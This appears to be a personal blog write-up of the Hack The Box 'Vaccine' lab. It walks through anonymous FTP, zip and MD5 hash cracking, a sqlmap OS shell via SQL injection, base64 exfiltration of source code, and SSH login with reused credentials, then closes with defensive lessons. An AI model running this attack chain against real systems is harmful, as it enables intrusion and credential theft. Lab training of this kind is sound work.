Yooo guys, it's ju4dy the landlord again.

# Vaccine — Hack The Box Starting Point

|  |  |
| --- | --- |
| **Platform** | Hack The Box — Starting Point |
| **Tier** | 2 |
| **Difficulty** | Easy |
| **Operating system** | Linux |
| **Target IP** | `10.129.57.202` |
| **Skills** | Anonymous FTP, archive hash cracking, MD5 cracking, SQL injection, `sqlmap` OS shell, PostgreSQL |

## Overview

Vaccine hosts a PHP "MegaCorp" login page backed by PostgreSQL. The box is a chain of small weaknesses
rather than a single exploit. An anonymous FTP server exposes an encrypted backup of the web application;
the archive password cracks instantly, and the extracted `index.php` contains an unsalted MD5 hash for the
administrator account. Once inside the dashboard, the `search` parameter is concatenated into a SQL query, so
`sqlmap` escalates the injection to arbitrary command execution on the host. From there the user flag and the
application source are readable, and the source hands over the PostgreSQL credentials — which are reused for
SSH.

## Enumeration

The full TCP range is scanned with version detection and default scripts. On this box the scan is slow, so
`-T4` keeps it within a sensible window.

```bash
nmap -T4 -p- -A 10.129.57.202
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-15 08:43 +0100
Nmap scan report for 10.129.57.202
Host is up (0.51s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.17.166
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|_     vsFTPd 3.0.3 - secure, fast, stable
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   417.79 ms 10.10.16.1
2   213.15 ms 10.129.57.202
```

Three services matter:

- **`21/tcp`** — `vsftpd 3.0.3` with **anonymous login allowed**. The `ftp-anon` script has already listed a
  single file, `backup.zip`, owned by `root`.
- **`22/tcp`** — OpenSSH, useful only once a password is known.
- **`80/tcp`** — Apache serving a login page titled *MegaCorp Login*. The `http-cookie-flags` script reports
  that the `PHPSESSID` cookie is set without the `HttpOnly` flag, meaning JavaScript on the page can read the
  session token.

The `OS details` line is a generic Linux kernel guess and is not reliable enough to target a kernel exploit; the
application is the intended path.

### Anonymous FTP

Anonymous access is the obvious entry point. `-4` forces IPv4 and `-v -a` enables verbose mode and anonymous
authentication:

```bash
ftp -4 10.129.57.202 -v -a
```

```text
Connected to 10.129.57.202.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
ftp> ls -la
229 Entering Extended Passive Mode (|||10645|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Apr 13  2021 .
drwxr-xr-x    2 0        0            4096 Apr 13  2021 ..
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Transfer complete.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10724|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
226 Transfer complete.
2533 bytes received in 00:00 (3.02 KiB/s)
ftp> quit
221 Goodbye.
```

The session is unprivileged (`id` is denied), but the archive is world-readable and downloads cleanly.

### Cracking the archive

`zip2john` converts the encrypted archive into a hash John can attack. The archive holds two files,
`index.php` and `style.css`, and both use the same password.

```bash
zip2john backup.zip > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
```

```text
Loaded 1 password hash (PKZIP [32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)
1g 0:00:00:00 DONE (2026-10-15 09:00) 100.0g/s 2457Kp/s 2457Kc/s 2457KC/s 123456..280789
Session completed.
```

With the password `741852963`, the archive opens and the application source is available offline:

```bash
unzip backup.zip
```

### Cracking the administrator hash

Reading the extracted `index.php` reveals a hard-coded MD5 digest for the administrator account:

```text
2cb42f8734ea607eefed3b70af13bbd3
```

MD5 is unsalted and fast, so either `hashcat` or John recovers the plaintext almost immediately:

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > admin_hash.txt
hashcat -m 0 admin_hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt
```

```text
qwerty789        (?)
1g 0:00:00:00 DONE (2026-10-15 09:24) 100.0g/s 10022Kp/s 10022Kc/s 10022KC/s shunda..pogimo
Session completed.
```

Credentials: `admin` / `qwerty789`. Logging in at `http://10.129.57.202/` lands on a car catalog dashboard
with a search box.

<!-- screenshot: MegaCorp dashboard after logging in as admin -->

## Exploitation

### SQL injection in the search parameter

The dashboard reloads as `dashboard.php?search=<term>`, and the term is placed straight into a PostgreSQL
query (`... where name ilike '%<term>%'`). Rather than hand-writing payloads, `sqlmap` is pointed at the
parameter:

```bash
sqlmap -u "http://10.129.57.202/dashboard.php?search=test" --cookie="PHPSESSID=vptugs79v0n7invl9qvbc9ih2j" --os-shell --batch
```

- `--cookie` supplies the authenticated session, because `dashboard.php` redirects to the login page without
  it. The value is the cookie issued after logging in and changes on every login.
- `--os-shell` asks `sqlmap` to escalate the injection to command execution. On PostgreSQL it uploads a small
  PHP wrapper into the web root and uses it to run system commands as the web user.
- `--batch` accepts the default answer to every prompt.

`sqlmap` confirms the injection and drops into an interactive `os-shell>` prompt.

### User flag

The web user can read the PostgreSQL home directory, where the user flag is stored:

```text
os-shell> cat /var/lib/postgresql/user.txt
```

### Reading the application source

`cat` on the dashboard returns nothing useful, so the file is exfiltrated as base64 instead — this survives
the transfer without quoting or encoding problems:

```text
os-shell> base64 /var/www/html/dashboard.php
do you want to retrieve the command standard output? [Y/n/a] Y
[06:31:45] [INFO] retrieved: 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiA+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9'
[06:31:46] [INFO] retrieved: 'IlVURi04Ij4KICA8dGl0bGU+QWRtaW4gRGFzaGJvYXJkPC90aXRsZT4KICA8bGluayByZWw9InN0'
...
[06:31:55] [INFO] retrieved: 'IHBvcnQ9NTQzMiBkYm5hbWU9Y2Fyc2RiIHVzZXI9cG9zdGdyZXMgcGFzc3dvcmQ9UEBzNXcwcmQh'
command standard output:
---
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiA+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9
...
ZC5qcyI+PC9zY3JpcHQ+Cgo8L2JvZHk+CjwvaHRtbD4K
```

Concatenating the chunks and decoding them with `base64 -d` recovers the page, including its database
connection string:

```php
<?php
session_start();
if($_SESSION['login'] !== "true") {
    header("Location: index.php");
    die();
}
try {
    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
}
catch ( exception $e ) {
    echo $e->getMessage();
}

if(isset($_REQUEST['search'])) {
    $q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";
    $result = pg_query($conn,$q);
    // ... rest of the code ...
}
?>
```

The source explains the whole box: the query is built by string concatenation (the injection), and the
PostgreSQL superuser credentials are hard-coded in the file that the web server can read.

### PostgreSQL credentials reused for SSH

The password from the connection string is also valid for the `postgres` system account over SSH:

```bash
ssh postgres@10.129.57.202
# Password: P@s5w0rd!
```

<!-- screenshot: SSH session as postgres -->

## Finishing the box

With a shell as `postgres`, local enumeration carried the escalation through to root and the final flag was
read. Vaccine is a chain of small weaknesses — an anonymous backup, two weak hashes, a concatenated query and
a reused password — where none of the steps is impressive on its own.

<!-- screenshot: root shell after escalation from postgres -->

## Key takeaways

- **Anonymous FTP should not expose application backups.** Even an encrypted archive leaks source once the
  password falls; the backup directory belongs outside the anonymous root, or behind authentication.
- **MD5 for passwords is a finding in itself.** `2cb42f8734ea607eefed3b70af13bbd3` fell to a wordlist in
  seconds; `password_hash()` with bcrypt or Argon2 and a per-user salt is the correct storage.
- **Never concatenate user input into SQL.** Prepared statements with bound parameters in `pg_query_params()`
  would have removed the injection, and `sqlmap`'s `--os-shell` would have had nothing to escalate.
- **Secrets must not live in web-readable files.** The `postgres` superuser password in `dashboard.php` gave
  a second, independent path onto the host; a restricted application user with a managed secret would have
  limited the blast radius.
- **Password reuse converts an application bug into host access.** The same string works for the database and
  for SSH, so one leaked file compromised both layers.
- **Session cookies need `HttpOnly`.** The scan flagged it at enumeration time; without it, any XSS on the
  dashboard would hand over an authenticated session.
